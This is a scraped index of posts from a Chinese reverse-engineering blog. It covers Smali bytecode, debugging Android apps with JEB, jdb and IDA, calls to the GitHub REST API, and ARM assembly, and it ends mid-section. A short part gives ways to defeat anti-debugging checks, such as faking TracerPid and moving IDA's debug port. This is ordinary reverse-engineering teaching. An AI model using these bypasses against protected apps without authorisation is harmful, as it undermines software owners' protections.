JEB(神器):将IDA的每个字母加1就是JEB.Android版的IDA. baksmali:反汇编Dex文件. smali:将修改后的smali文件重新编译为Dex文件.通常我们使用Jeb寻找关键位置,然后baksmali修改,smali重新编译. 但是这样太麻烦了,就有了apktool. apktool:Google提供的apk编译工具,内部用baksmail,加了资源的解析和编译. ","date":"2021-09-05","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/smali/:0:2","tags":["Android"],"title":"Smali","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/smali/"},{"categories":["Android基础"],"content":"Smali汇编 概述 寄存器: Dalvik是基于寄存器的虚拟机,没有栈,寄存器为v0-v65535. 不用任何寄存器存函数返回值. 类型表示: 语法 类型 V void Z boolean B byte S short C char I int J long F float D double L 类类型 [ 一维数组 [[ 二维数组 [[[ 三维数组 .method myAdd(I, I)I 方法表示: Dalvik使用方法名,参数,返回值来描述一个方法. 方法格式: LPackage/Name/ObjectName;-\u003eMethodName(III) Z LPackage/Name/ObjectName; : 类类型 MethodName : 方法名 (III) : 为参数类型(int,int,int) Z : 为返回值类型(boolean) invoke-virtual {p0, v0, v1}, Lorg/example/luotst/MainActivity;-\u003emyAdd(II)I 字段表示: Dalvik使用类类型,字段名字,字段类型来描述一个字段. 字段格式: LPackage/Name/ObjectName;-\u003eFieldName:Ljava/lang/String LPackage/Name/ObjectName; : 类类型 FieldName : 为字段名称 Ljava/lang/String : 为字段类型 .line 23 const/16 v0, 0x14 iput v0, p0, Lorg/example/luotst/MainActivity;-\u003emData1:I .line 24 const-string v0, \"LuoHun\" iput-object v0, p0, Lorg/example/luotst/MainActivity;-\u003emData2:Ljava/lang/String; 参数与局部变量的区分: Java代码: int myAdd(int n1, int n2){ int l1 = 10; int l2 = 20; return n1 + n2; } 对应的smali示例: .method myAdd(I, I)I .registers 6 00000000 const/16 v0, 10 00000004 const/16 v1, 20 00000008 add-int v2, p1, p2 0000000C return v2 .end method 上图中p1,p2是Jeb为我们显示的,这是P命名法,为了修改代码和我们识别函数参数方便而设计的,实际上是寄存器v4,v5. smali中的局部变量使用的寄存器是V0-Vn,参数使用的寄存器是Vn+1-Vm. 从上图中可以看到用了6个寄存器,myAdd的参数声明中用了2个,加上this指针就是3个,也就是说v3-v5是参数, 从而推出v0-v2是局部变量,需要注意的是v3中存放的是this指针. 需要提一点的是,P命名法的好处,假如说我们新增了一个局部变量寄存器,这样的话,参数寄存器就会全变动,十分麻烦,使用P命名法,我们新增了一个局部变量寄存器,重新编译的时候,工具会帮我们自动将原来的参数寄存器加1. 指令 主要查看dalvik-bytecode.html文件. nop 空操作,通常是为了地址对齐. move 4字节整型传送: Dalvik是基于寄存器的,没有栈的概念,全部用寄存器操作,寄存器最大有65536个. 上述第一条指令用4位表示寄存器,4位可表示的寄存器范围为v0-v15, 若是一个函数局部变量很多,寄存器使用超过了16个,第一条指令就放不下了, 所以有了第2和第3条指令. /from表示源寄存器用16位表示 /16表示目标和源寄存器均用16位表示. 示例: Java: int l1 = 10; int l2 = 20; l1 = l2; Smali: 00000000 const/16 v0, 10 00000004 const/16 v1, 20 00000008 move v0, v1 8字节整型传送: 寄存器是32位的,long是64位,一个寄存器放不下,所以用两个相邻的寄存器存放64位整型, move-wide就是用来传送64位整型. 示例: Java: long l1 = 10; long l2 = 20; l1 = l2; Smali: 00000000 const-wide/16 v0, 10 00000004 const-wide/16 v2, 20 00000008 move-wide v0, v2 对象传送: mov-object用来传送类对象. 示例: Java: MainActivity m1 = this; Smali: 0000000A move-object v4, p0 取返回值: 在smali中,不用任何寄存器来存放函数的返回值,需要通过move-result来取函数的返回值. 示例: Java: @Override protected void onCreate(Bundle savedInstanceState) { if (D){ Log.d(TAG, \"onCreate\"); } super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); int n = myAdd(100, 200); } int myAdd(int n1, int n2){ return n1 + n2; } Samli: 00000020 const/16 v0, 100 00000024 const/16 v1, 200 00000028 invoke-virtual MainActivity-\u003emyAdd(I, I)I, p0, v0, v1 0000002E move-result v0 取异常: 示例: Java: try { ServerSocket s = new ServerSocket(0x5566); } catch (IOException e) { e.printStackTrace(); } Smali: :try_0 00000000 new-instance v0, ServerSocket 00000004 const/16 v1, 0x5566 00000008 invoke-direct ServerSocket-\u003e\u003cinit\u003e(I)V, v0, v1 .catch IOException {:try_0 .. :tryend_E} :catch_10 :tryend_E 0000000E goto :18 :catch_10 # used for: Ljava/io/IOException; 00000010 move-exception v0 00000012 invoke-virtual IOException-\u003eprintStackTrace()V, v0 return const 示例: Java: int n1 = 1; int n2 = 16; int n3 = 0x12345678; int n4 = 0x14000000; long l1 = 2; long l2 = 0x12345678; String str = \"Hello Luo\"; Class cls = MainActivity.class; Samli: 00000000 const/4 v0, 1 00000002 const/16 v1, 16 00000006 const v2, 305419896 0000000C const/high16 v3, 0x14000000 00000010 const-wide/16 v4, 2 00000014 const-wide/32 v6, 305419896 0000001A const-string v8, \"Hello Luo\" 0000001E const-class v9, MainActivity monitor 同步指令. 示例一: Java: synchronized int myAdd(int p1, int p2) { return p1 + p2; } Samli: .method declared-synchronized myAdd(I, I)I .registers 3 00000000 monitor-enter p0 00000002 add-int/2addr p1, p2 00000004 monitor-exit p0 00000006 return p1 .end method 示例二: Java: int mySub(int p1, int p2) { synchronized (this) { return p1 - p2; } } Samli: .method mySub(I, I)I .registers 3 00000000 monitor-enter p0 00000002 sub-int/2addr p1, p2 :try_4 00000004 monitor-exit p0 00000006 return p1 :catch_8 # used for: * 00000008 move-exception p1 0000000A monitor-exit p0 .catchall {:try_4 .. :trye","date":"2021-09-05","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/smali/:0:3","tags":["Android"],"title":"Smali","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/smali/"},{"categories":["Android基础"],"content":"Smali调试 jdb.exe jdwp协议: 是Java Debug Wire Protocol的缩写,定义了调试器(debugger)和被调试的Java虚拟机(target vm)之间的通信协议. 使用jdwp协议来双机调试Android程序,调试之前需要端口映射,但很多工具已提前做好了端口映射. adb forward tcp:8700 jdwp:PID jdb所在目录: 输入jdb –help可查看帮助. jdb可以用来调Android程序,Android上调试端口一般为8700,但是单步很麻烦,很多工具已集成该功能. Android调试运行 AndroidMenifest文件说明Debug android:debuggable=\"true\" 虚拟机加不加这个都可以调试. 使用am调试运行 位于Android系统,system/bin目录. 查看帮助 命令行输入 adb shell进shell 然后输入am,即可查看帮助. 调试运行一个Activity am start -D -N org.example.luotest/.MainActivity Jeb 被调试程序源代码: public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button button = findViewById(R.id.button); button.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { int n = 3; Log.d(\"Luo\", \"onClick: \" + n); } }); } } 附加调试: 切记调试的时候,关闭AndroidStudio,AS会占用8700端口. 在虚拟机中运行该程序. 用Jeb打开该apk,找到按钮相应函数,下断(Ctrl + B) Jeb菜单,调试器开始. 点附上,Jeb就会附加. 在虚拟机中,点击程序的按钮,就会在刚开始下断的地方断下. AndroidStudio 下载Smali反汇编插件 smalidea. https://bitbucket.org/JesusFreke/smalidea/downloads/ 安装插件. 使用apktool反编译apk. java -jar apktool.jar d -f app-debug.apk 使用AS导入刚反编译出来的文件 调试运行一个Activity //adb shell am start -D -n packageName/ActivityName(这两个参数在AndroidMainfest.xml里都可以找到) //分别对应package=xxx activity中android:name=xxx adb shell am start -D -N org.example.luotest/.MainActivity 端口映射 adb forward tcp:8700 jdwp:2745 AS下断,远程附加 点击Debug按钮进行调试,就可以调试了. 反调试 检测调试标志 对策:给open这个api下断,发现他读的TracePid,就返回0. 时间差 不通过api拿时间,防止别人通过下时间断点来修改时间. 检测IDA端口号23946 修改IDA端口号: /data/local/tmp/android_server -i 127.0.0.1 -p 8899 ","date":"2021-09-05","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/smali/:0:4","tags":["Android"],"title":"Smali","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/smali/"},{"categories":["平台API"],"content":"概述 v3版Api的文档链接 v3版Api的官方教程 ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:1:0","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"基本访问路径 只是读取的话,完全不用任何授权,可以在命令行、Insomnia、网页等各种情况下直接输入链接访问任何人的所有公开信息. 个人主要信息: https://api.github.com/users/用户名 得到的数据如下图: ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:0","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"个人所有repo https://api.github.com/users/用户名/repos 会得到一个repo的JSON格式列表. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:1","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"repo详细信息 https://api.github.com/repos/用户名/仓库名 ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:2","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"获取某个repo的内容列表 https://api.github.com/repos/用户名/仓库名/contents 注意 只会返回根目录的内容. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:3","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"获取repo中子目录的内容列表 https://api.github.com/repos/用户名/仓库名/contents/目录名 注意 一定要完全遵循原文件名的大小写,否则无法获得信息.如果是更深层的内容,则在链接列按照顺序逐级写上目录名称. 获取repo中某文件信息: https://api.github.com/repos/用户名/仓库名/contents/文件路径 文件路径是文件的完整路径,区分大小写,只会返回文件基本信息. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:4","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"获取某文件的原始内容(Raw) 通过上面的文件信息中提取download_url这条链接,就能获取它的原始内容了. 直接访问:https://raw.githubusercontent.com/用户名/仓库名/分支名/文件路径 ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:5","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"repo中所有的commits列表 https://api.github.com/repos/用户名/仓库名/commits ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:6","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"某一条commit详情 https://api.github.com/repos/用户名/仓库名/commits/某一条commit的SHA ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:7","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"issues列表 https://api.github.com/repos/用户名/仓库名/issues ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:8","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"某条issue详情 https://api.github.com/repos/用户名/仓库名/issues/序号 issues都是以1,2,3这样的序列排号的. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:9","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"某issue中的comments列表 https://api.github.com/repos/用户名/仓库名/issues/序号/comments 这个地方有坑,直接按上述那样写的话,最多拿到30条comments,需要先通过拿issue详情,得到comments的个数,然后加参数 ?page=1\u0026per_page=100 循环拿Comments个数. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:10","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"某comment详情 https://api.github.com/repos/用户名/仓库名/issues/comments/评论详情的ID 其中评论ID是从issues列表中获得的. 注意 访问的链接最后不能有/,如https://api.github.com/users/XiaLuoHun是可以访问到个人信息的,但是https://api.github.com/users/XiaLuoHun/就不行了,唯一不同是多了一个/. Github的API访问链接是区分大小写的. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:2:11","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"查询参数 如果在上面基本链接中加入查询条件,那么返回的数据就是filtered,过滤了的.比如要求让列表数据分页显示,或者只返回正在开放的issues.常用如下: 分页功能.格式是?page=页数\u0026per_page=每页包含数量. 如:https://api.github.com/users/dnspy/repos?page=1\u0026per_page=2 issues状态.格式是?state=状态. 状态:open、closed. 如:https://api.github.com/repos/x64dbg/x64dbg/issues?state=open ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:3:0","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"权限认证 首先需要知道都是,到此为止之前所有的查询都是不需要任何权限的,给个地址就返回数据,全公开. 但是创建文件、更新、删除等就是必须用自己的账号\"登录\"才能实现的.所以为了下面的增删改做准备,需要先看一下权限问题. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:4:0","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"Basic authentication 这种最简单,如果是用curl的话. curl -u \"用户名:密码\" https://api.github.com 如果是用Insomnia等调试工具的话,直接在Auth选项栏里选Basic Auth,然后填上用户名密码即可. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:4:1","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"OAuth2 token token: 说白了就是第二个密码,你既可以不用到处泄露自己的用户名和密码,又可以专门给这个\"第二密码\"设置不同的权限,如有的只可读,有的还可以写等.除此之外,你还可以设置很多个token,也就是第三、第四、第五…密码. 设置token方法: 位于github个人账号设置-\u003e开发者设置-\u003e个人token.创建一个新token时,可以选择具体的权限,创建成功时一定要复制到本地保存,只会让你看见一次,如果忘记的话就需要重新生成(其实丢了也不算麻烦). 注意 token字符串不能存储在github的repo中,经过测试,一旦提交的文件中包含这个token字符串,那么github就会自动删除这个token. 用token通过权限认证: 作为url中的参数明文传输. curl https://api.github.com/?access_token=OAUTH-TOKEN 作为header中的参数传输. curl -H \"Authorization: token OAUTH-TOKEN\" https://api.github.com 如果不是用curl而是Insomnia测试的话,和上面basic auth是大同小异的,很容易操作就不复述了. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:4:2","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"OAuth2 key/secret 这个是除了Personal Access Token之外的另一种好用的方法,即创建自己的OAuth app,然后得到一对client_id和client_secret.如下: 得到这两个值之后,直接在访问任何api的url连接后面显性加上这两个参数即可完成认证,如: https://api.github.com/users/YOUR-USERR-NAME?client_id=YOUR-CLIENT-ID\u0026client_secret=YOUR-CLIENT-SECRET 注意 目前这种认证方式不支持查询以外的操作,也就是只能GET获取某些api信息,不能执行request里的任何put/PATCH/delete操作. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:4:3","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"增改删contents 官方文档 注意 必须添加权限验证(上面有写). 数据传送格式选择json. 文件内容必须是把内容转为Base64字符串再存到json变量中. 文件路径中如果有不存在的文件夹,则会自动创建. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:5:0","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"增 传输方法:put 访问路径:https://api.github.com/repos/用户名/仓库名/contents/文件路径 json格式: { \"message\": \"commit\", \"content\": \"VGVzdCBmaWxl\" } 示例: ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:5:1","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"改 传输方法:put 访问路径:https://api.github.com/repos/用户名/仓库名/contents/文件路径 json格式: { \"message\": \"update file\", \"content\": \"dXBkYXRlIFRlc3QgZmlsZQ==\", \"sha\": \"84362ca046b156d71d84fa5356ae9afbcb282919\" } 注意 必须指定该文件的sha码,相当于文件的ID. 文件的sha码会随着文件内容变化而变化,所以必须每次都重新获取才行. 如何获取的话,参考前面的 获取repo中某文件信息. 示例: ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:5:2","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"删 传输方法:delete 访问路径:https://api.github.com/repos/用户名/仓库名/contents/文件路径 json格式: { \"message\": \"delete file\", \"sha\": \"115132afb3f1dfcfc0ce11263f944f2d8ac956f2\" } 示例: ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:5:3","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"增改删issues 官方文档 和上面contents的增删改差不多,唯一不同的是,issues是不用把内容转为Base64码的. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:6:0","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"增 传输方法:post 访问路径:https://api.github.com/repos/用户名/仓库名/issues json格式: { \"title\": \"Creating issue\", \"body\": \"Posting a issue\" } 注意 issue的数据里面是可以加label,milestone和assignees的.但是milestone和assignees必须是与已有的名次完全对应才行,否则无法完成创建. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:6:1","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"改 传输方法:patch 访问路径:https://api.github.com/repos/用户名/仓库名/issues/序号 json格式： { \"title\": \"Creating issue updated\", \"body\": \"Posting a issue\\n\\n Updated from insomnia.\", \"state\": \"open\" } 注意 如果json中加入空白的labels或assignees,如\"labels\": [],作用就是清空所有的标签和相关人. ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:6:2","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"锁住某条issue 不允许别人评论(自己可以). 传输方法:put 访问路径:https://api.github.com/repos/用户名/仓库名/issues/序号/lock json格式: { \"locked\": true, \"active_lock_reason\": \"too heated\" } ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:6:3","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"解锁某条issue 传输方法:delete 访问路径:https://api.github.com/repos/用户名/仓库名/issues/序号/lock 无json传输 ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:6:4","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"增改删comments ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:7:0","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"增 传输方法:post 访问路径:https://api.github.com/repos/用户名/仓库名/issues/序号/comments json格式: { \"body\": \"Create a comment\" } 示例: ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:7:1","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"改 传输方法:patch 访问路径:https://api.github.com/repos/用户名/仓库名/issues/comments/评论ID json格式: { \"body\": \"Create a comment \\n\\n--Updated\" } 注意 地址中,issues后不用序号了,因为可以通过唯一的评论ID追查到.查看评论ID的方法,可参考上面的 某issue中的comments列表. 示例: ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:7:2","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"删 传输方法:delete 访问路径:https://api.github.com/repos/用户名/仓库名/issues/comments/评论ID 无json传输 ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:7:3","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["平台API"],"content":"参考链接 一篇文章搞定Github API 调用 (v3） ","date":"2021-08-31","objectID":"/posts/%E5%B9%B3%E5%8F%B0api/github/:8:0","tags":["Github"],"title":"Github Api调用","uri":"/posts/%E5%B9%B3%E5%8F%B0api/github/"},{"categories":["Android基础"],"content":"基本概念 Arm处理器特点 体积小、低功耗、低成本、高性能. 支持Thumb(16位)/ARM(32位)双指令集,能很好的兼容8位/16位器件. 大量使用寄存器,指令执行速度更快. 大多数数据操作都在寄存器中完成. 寻址方式灵活简单,执行效率高. 指令长度固定. 数据和指令类型 Arm约定数据长度如下: byte(字节) 8bits Halfword(半字) 16bits Word(字) 32bits Arm指令集: 指令集 指令长度 thumb 2字节(16位) arm 4字节(32位) thumb2(常用) 2字节和4字节混合 工作状态 ARM状态:32位,ARM状态执行字对齐的32位ARM指令. Thumb状态:16位,执行半字对齐的16位指令. 状态的切换,看标志寄存器的T位. 寄存器 ARM 处理器一般共有37个寄存器,其中包括: 31个通用寄存器,包括 PC(程序计数器)在内,都是32位的寄存器 6个状态寄存器,都是32位的寄存器 3环可操作的寄存器有17个,R0-R15 CPSR(标志寄存器),除此之外 还有浮点寄存器 重要寄存器: R13(SP):栈指针. R14(LR):链接寄存器,保存返回值.Call指令,将Call的下条指令地址给R14,但是当Call中嵌套调Call时,还是会将LR寄存器压栈保存. R15(PC):程序计数器,等价于x86的EIP. 历史遗留别名寄存器: R11(FP) R12(IP) 标志寄存器: ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:0:1","tags":["Android"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"编译环境 手工编译 本地程序生成过程: 预处理 gcc -E hello.c -o hello.i C到汇编 gcc -S -mthumb hello.i -o hello.s 汇编到Arm gcc -c hello.s -o hello.o 链接 gcc hello.o -o hello 汇编编译器: 编译的时候用Clang 加命令行参数-S,就可以调到上述的汇编编译器. 示例: hello.c: #include \u003cstdio.h\u003e int main(){ printf(\"Hello Arm\\n\"); return 0; } Markfile脚本: NDK_PATH :=D:/AndroidSDK/ndk/21.4.7075529/toolchains/llvm/prebuilt/windows-x86_64/bin BUILD_CLANG :=$(NDK_PATH)/armv7a-linux-androideabi16-clang all: #预处理 $(BUILD_CLANG) -E -o Hello.i Hello.c #C到汇编 -m是指cpu -marm 编译arm -mthumb 编译thumb $(BUILD_CLANG) -S -mthumb -o Hello.s Hello.i #编译 $(BUILD_CLANG) -c -o Hello.o Hello.s #链接 $(BUILD_CLANG) -o Hello Hello.o install: adb push Hello /data/local/tmp adb shell chmod a+x /data/local/tmp/Hello adb shell /data/local/tmp/Hello Arm_手工编译.7z Cmake编译 不支持Arm编译,仅支持x86汇编. ndk-build编译 新建一个jni或cpp文件夹,将.s文件放进去. .text .globl main .p2align 2 .type main,%function .code 32 main: push {r11, lr} @ToDo pop {r11, pc} .p2align 2 main_end: .size main, main_end-main 新建一个Android.mk文件. LOCAL_PATH := $(call my-dir) include $(CLEAR_VARS) #存储要构建的模块的名称 LOCAL_MODULE := LuoHello #列举源文件 LOCAL_SRC_FILES := Hello.s #包含编译脚本 include $(BUILD_EXECUTABLE) 新建一个Application.mk文件. APP_PLATFORM := android-16 APP_ABI := armeabi-v7a 命令行输入ndk-build进行编译. Arm_ndk_Build编译.7z ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:0:2","tags":["Android"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"Arm调试 准备一个Arm虚拟机或者真机 概述: 将IDA中的dbgsrv程序放到Android系统中并运行起来,然后和IDA交互完成调试. 将ndk程序(LuoHello)以及IDA dbgsrv放到Android系统中 INSTALLAPP_PATH :=C:/Users/XiaLuoHun/Desktop/Build/libs/armeabi-v7a INSTALLAPP_NAME :=LuoHello INSTALLAPP :=$(INSTALLAPP_PATH)/$(INSTALLAPP_NAME) REMOTEPATH :=/data/local/tmp REMOTEAPP :=$(REMOTEPATH)/$(INSTALLAPP_NAME) IDADBGSERVER :=D:\\LuoHackTools\\Tools\\Disassemblers\\IDA_Pro_v7.5\\dbgsrv IDADBGSERVER_NAME := android_server install: adb push $(INSTALLAPP) $(REMOTEPATH) adb shell chmod a+x $(REMOTEAPP) adb shell $(REMOTEAPP) debug: adb forward tcp:23946 tcp:23946 adb push \"$(IDADBGSERVER)/$(IDADBGSERVER_NAME)\" $(REMOTEPATH) adb shell chmod a+x $(REMOTEPATH)/$(IDADBGSERVER_NAME) #IDA远程启动某个ndk程序调试 下面的方式是可以的, #但如果是附加调试 遍历进程时,会没有权限 要以Root权限运行才可以 adb shell $(REMOTEPATH)/$(IDADBGSERVER_NAME) Arm_IDA调试示例.7z IDA调试设置: 远程启动: 保证上述IDA dbgsrv运行起来 IDA远程启动 Main函数 调试推荐: 定位Main函数. 找到Main函数后 F2下个断. F9选择调试器,配置好参数就可以调试了. ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:0:3","tags":["Android"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"寻址方式 寄存器寻址 mov r0, r1 add r0, r1, r2 add r0, r1 @等价于add r0, r0, r1 立即寻址 mov r0, #1 mov r0, #0x5678 movt r0, #0x1234 寄存器移位寻址 mov r0, r1, lsl #2 add r0, r1, lsl #2 add r0, r1, lsl r2 add r0, r1, lsr r2 寄存器间接寻址 ldr r0, [sp] 基址寻址 ldr r0, [sp, #4] @前基址 ldr r0, [sp], #4 @后基址 ldr r0, [sp, r0] 多寄存器寻址 stmfd sp!, {r0-r5, r8, pc} @!回写 会自动修改sp的值 ldmfd sp!, {r0-r5, r8, pc} 堆栈寻址 概述: 堆栈方向 向上生长:向高地址方向生长, 称为递增堆栈 乡下生长:向低地址方向生长, 称为递减堆栈 满和空堆栈 堆栈方式 LDMFA LDMEA F:满 full E:空 empty STMFA STMFD A:加 add D:减 decrease 示例: stmfd sp!, {r0-r5, r8, pc} @!回写 会自动修改sp的值 ldmfd sp!, {r0-r5, r8, pc} 块拷贝寻址 ldmia ldmda i:inc d:dec ldmia ldmib a:after b:befor ldmia 取内容之后加4 ldmib 取内容之前加4 @inc dec after befor ldmia sp, {r0, r1} ldmda sp, {r0, r1} ldmib sp, {r0, r1} ldmdb sp, {r0, r1} 相对寻址 ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:0:4","tags":["Android"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"Arm指令格式 ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:0:5","tags":["Android"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"存储器访问指令 单寄存器 概述: 指令编码: 加载指令: @单寄存器加载 ldr r0, [sp] @[sp] 4字节内容给r0 ldrb r0, [sp] @[sp] 1字节内容给r0 高位补0 ldrh r0, [sp] @[sp] 2字节内容给r0 高位补0 ldrd r0, [sp] @[sp] 8字节字节内容 给r0 存不下的放r1 @有符号 ldrsb r0, [sp] @[sp] 1字节内容给r0 高位补符号位 ldrsh r0, [sp] @[sp] 2字节内容给r0 高位补符号位 @上述指令加ex版本的表示原子操作(内存锁) 加t版本的为带用户特权(内核用) ldrex r0, [sp] 存储指令: @单寄存器存储 mov r0, sp @mov r1, #1 @str r1, [r0] @r1 4字节内容给[r0] @strb r1, [r0] @r1 1字节内容给[r0] @strh r1, [r0] @r1 2字节内容给[r0] @strd r2, [r0] @r2 r3 8字节内容给[r0] 寻址方式: @前变址 mov r3, sp ldr r0, [r3, #-4] @[r3-4] 4字节内容给r0 r3不变 @后变址 ldr r0, [r3], #-4 @[r3] 4字节内容给r0 r3 = r3 - 4 多寄存器 概述: 指令编码: 8种模式: 加载指令: @inc dec after befor @加载 mov r3, sp ldmia r3, {r0-r2} @取内容之后加 将[r3] [r3+4] [r3+8]处的内容,依次给r0 r1 r2 ldmib r3, {r0-r2} @取内容之前加 将[r3+4] [r3+8] [r3+0xC]处的内容,依次给r0 r1 r2 ldmda r3, {r0-r2} @取内容之后减 将[r3] 